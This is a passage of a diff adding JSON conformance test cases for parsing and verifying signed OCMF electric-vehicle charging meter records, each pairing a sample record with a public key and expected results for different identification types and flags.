+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"PHONE_NUMBER\",\"ID\":\"+491701234567\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100AF465D34E8726DF80AB761EC79BEBA851B4FA9CDBC7A0272AEBC52FAE9D04A3B02201D429E927AFE37462A6DA8BA6B203D9D4C865B5B9E8DFFA0C2FA286B9B60EE0E\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-KEY_CODE",
+   "group": "table",
+   "description": "IT = KEY_CODE, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"KEY_CODE\",\"ID\":\"K-90210\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402206357686B15B9ACE2BCED3B4BD222D77354E05EDFFE224AF85B0165DF198F06AA0220274514B049EAB4E680AFDE04BB0A3A873EE9104D803AF211BEB4FFD5D40BC622\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-RFID_NONE",
+   "group": "table",
+   "description": "IF contains RFID_NONE [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220525A58BEE042F6D15C3E864FF7EF4AACC5BB9BDB004ACD77EA56B4FF51B904AF022017E00F4F27D27DD8A227D464FC713C90B08E5B93159A4323672A0B64E9A31825\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-RFID_PLAIN",
+   "group": "table",
+   "description": "IF contains RFID_PLAIN [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E1834E24BB331913FE72059FD1C588698CE066EEB11A89A1BA38429F85C0F0F40220455194C22931D4D16580C3033DF6497BA656DBD1BD728710CC3D9FCC0BF9AE12\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-RFID_RELATED",
+   "group": "table",
+   "description": "IF contains RFID_RELATED [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_RELATED\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210082268256300AEF7EB1E5CF46699788205977885C340B197F8AA5BDCFBDD1F223022066B6A1BD7A3CFEE4B5FFE14EDD1B9BB3173A8A9E310D6E7D6667794AC5FE6D70\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-RFID_PSK",
+   "group": "table",
+   "description": "IF contains RFID_PSK [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PSK\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022007BD31DF457CE17B9965ACEC8AEC4038BC4CB0345D5B1235B5DA366182059A68022014A83D4E561EDAEB3BAD520F34534883C77B4378CECA90BD08E4235AA2AC84A8\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_NONE",
+   "group": "table",
+   "description": "IF contains OCPP_NONE [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A5E372A842977B6211F43441DA42F78C1E52ECAFE5DE64FA06122FE0B4DCA9FA0220009264D13BDFCFC3CECA13AD46C7AB21D42958AEE89395C87B6B08D21553E6D0\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_RS",
+   "group": "table",
+   "description": "IF contains OCPP_RS [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_RS\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100F0AEB4EF25604A8304211E59DC42944EF75A596CA62C060ADEE7DBB609E8FD6E02202C5F7A2A6FB8273F4E4C7568594069DDC6A4F592A448C61656F43A694D55FFFF\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_AUTH",
+   "group": "table",
+   "description": "IF contains OCPP_AUTH [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_AUTH\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100FD2A10D22308D83D1346D10C9EFA840F0D349FC23412112BD639A6258FC1E60C02200EC3C5083FF4B60703785DEE579D9D43FFBE563976D35A7AF5371B924F3A8EA7\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_RS_TLS",
+   "group": "table",
+   "description": "IF contains OCPP_RS_TLS [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_RS_TLS\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207CD7607F41024D15DBE127A0DD865586008171A88A7A193DE21500563037E3B002206AEF6252C006749103FCCF2743BCEC567AD8D768A3D031FF2062F442CF6B6FBD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_AUTH_TLS",
+   "group": "table",
+   "description": "IF contains OCPP_AUTH_TLS [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_AUTH_TLS\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A4A97B7ABE1D2CED4E96DCA42F9D640F49A02EB332FA6AA917D75622C3759676022014014348395B0DE133045AE14910CC6388A06E327DAF78AA297C3564BCC33BC1\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_CACHE",
+   "group": "table",
+   "description": "IF contains OCPP_CACHE [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_CACHE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022071C094923AB68D2132FB893C309B8C2E1B46F82C1C6430B3D14FE275F700CEC302203C419C08528DA3AA650DAD39567D069BE80A695B7E43F617B0CA9787BD7607F4\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_WHITELIST",
+   "group": "table",
+   "description": "IF contains OCPP_WHITELIST [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_WHITELIST\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E813C3A1E1BD3C8418ABBDAFC0C5EEAB50211FD7EB910794B7D1756ECD49F7D00220512273617363B0BB9CC99B534E4493D7743CF8FBCD272987C5A9D680605D70F7\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-OCPP_CERTIFIED",
+   "group": "table",
+   "description": "IF contains OCPP_CERTIFIED [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"OCPP_CERTIFIED\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022010F376AD6D860F7F818B5F7745E99F9C85F0775540E0A1157E7B355DD39CF54D02205571A8C03B4B475ED94FE4B828E284EE9EC8E04942C423DD2C4BC7B382A01E9A\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-ISO15118_NONE",
+   "group": "table",
+   "description": "IF contains ISO15118_NONE [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"ISO15118_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402202F3C955FCB79F73A594367A5DA8F19FEB85A96331DA0DF2C00488FE746C983AE0220680B7C112403BA257F5144297258673AFD68B696D30E6D0FD165264C7EC88AF8\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-ISO15118_PNC",
+   "group": "table",
+   "description": "IF contains ISO15118_PNC [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"ISO15118_PNC\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022043A236B810CF35C585309EA6AA1B00FE608E0303112470451B8BBD9FC88FFF16022071C22558DFD7927D20220685DCCFF12C8DA380DC4A40C1F37E7C71578E0A6F37\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-PLMN_NONE",
+   "group": "table",
+   "description": "IF contains PLMN_NONE [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C813FEF74FBE267095C8B0B3AB6FF52057275E84DACEEB190BC4346CD0CA3B4A02204B7D03F2115EE2DA53F300EE0E22A067A0477B31B06260BC9AC94015A7B1F146\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-flag-PLMN_RING",
+   "group": "table",
+   "description": "IF contains PLMN_RING [OCMF Tab. 13-16]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"PLMN_RING\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200B9906F42FEFB12A6DAD101244D2D3F0CA26EFC525564C2035CC610EDFF44D6002200BBCC2488C5EF001B9F4A93B58921B827EDC842BB8F99D9DCB5FAED12F9419BD\"}",
